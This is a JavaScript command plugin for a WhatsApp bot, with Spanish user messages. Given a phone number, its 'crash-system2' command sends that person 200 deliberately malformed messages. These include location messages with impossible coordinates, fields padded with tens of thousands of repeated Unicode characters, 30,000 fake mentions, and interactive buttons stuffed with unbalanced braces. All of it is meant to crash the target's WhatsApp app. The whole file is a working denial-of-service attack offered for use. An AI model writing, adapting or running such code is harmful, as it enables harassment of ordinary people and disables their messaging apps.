let handler = async (m, { conn, args }) => {
  if (!args[0]) return m.reply("😡 Debes escribir un número.\nEjemplo: .crash-system2 +5552456467");

  const target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const delay = (ms) => new Promise((res) => setTimeout(res, ms));

  // Aviso al usuario que ejecutó el comando
  await m.reply("😼 Procesando espere 5 minutos para volverlo a usar");

  async function Crashui(target) {
    let Crash = "༑⌁⃰𝕭𝖞-𝕮𝖍𝖎𝖓𝖆ཀ‌‌🦠" + "ꦾ".repeat(65000);
    await conn.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 999.03499999999999,
          degreesLongitude: -999.03499999999999,
          name: Crash,
          url: "https://youtube.com/@DavaExploit",
          address: "𑇂𑆵𑆴𑆿".repeat(45000),
        },
        hasMediaAttachment: true,
      },
      {
        participant: { jid: target },
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 30000 }, () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
      }
    );
  }

  async function ForceXsystem(kirana, target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 99999999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "༑⌁⃰𝕭𝖞-𝕮𝖍𝖎𝖓𝖆ཀ‌‌🦠" + "ꦾ".repeat(35000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(15000),
              buttons: [
                { name: "single_select", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "call_permission_request", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_url", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_call", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_copy", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_reminder", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "cta_cancel_reminder", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "address_message", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "send_location", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "quick_reply", ParamsJson: "{".repeat(15000), version: 3 },
                { name: "mpm", ParamsJson: "{".repeat(10000), version: 3 },
              ],
            },
          },
        },
      },
    };

    await kirana.relayMessage(target, message, {
      participant: { jid: target },
    });
  }

  // 200 mensajes = 4 ciclos (25+25) * 4
  for (let cycle = 0; cycle < 4; cycle++) {
    for (let i = 0; i < 25; i++) {
      await Crashui(target);
      await delay(1500);
    }
    for (let i = 0; i < 25; i++) {
      await ForceXsystem(conn, target);
      await delay(1500);
    }
  }

  await conn.reply(m.chat, "✅ Secuencia de 200 mensajes completada.", m);
};

handler.command = /^crash-system2$/i;
export default handler;
